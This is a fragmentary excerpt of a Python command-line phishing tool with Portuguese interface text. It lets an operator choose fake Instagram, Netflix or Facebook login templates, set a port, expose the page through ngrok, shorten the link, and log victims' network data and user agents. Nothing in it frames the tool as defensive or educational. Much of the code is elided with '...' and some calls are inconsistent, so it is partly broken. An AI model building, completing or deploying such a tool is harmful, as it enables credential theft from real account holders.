...
def menu_program(): #Menu do Programa
   ...
   if (verificar_log == True):
     ...
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + R + "help" + C + " ou " + R + "?" + C + " para obter ajuda")
     ...
     while (True):
        ...
        if (not prompt): #Se nada foi digitado, continue a execução
         ...
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
          ...
          banner_program()
          print ("\n" +  C + "Comando:" + W + " show options " + C + "=> " + R + "exibir configuração de Phishing")
          print ("\n" +  C + "Comando:" + W + " set template (instagram,netflix) " + C + "=> " + R + "setar um Template")
          print ("\n" +  C + "Comando:" + W + " set porta (8080,3333) " + C + "=> " + R + "setar uma Porta")
          ...
          try:
            ...
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                ...
                arquivo.write("\n" + encurtar_url)
                arquivo.close()
                phishing_attack(template_phishing,porta,url_action,encurtar_url)
                break
            else:
...
def phishing_attack(template_phishing,porta,url_action,encurtar_url):
...
exit();''' %url_action)
       ...
       if (verificar_url_ngrok == True):
         ...
         if (encurtar_url == "on" or encurtar_url == "ON"):
           ...
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             ...
             while (True):
               ...
               if (verificar_network == True):
                 ...
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Dados de Rede: " + G + "%s" %user_agent)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
             ...
             while (True):
               ...
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action)
       else:
   ...
   while (True):
        ...
        if (not prompt):
         ...
         try:
          ...
          print ("\n" +  C + "Comando:" + W + " set template (instagram,facebook) " + C + "=> " + R + "setar um Template")
          ...
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "facebook"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
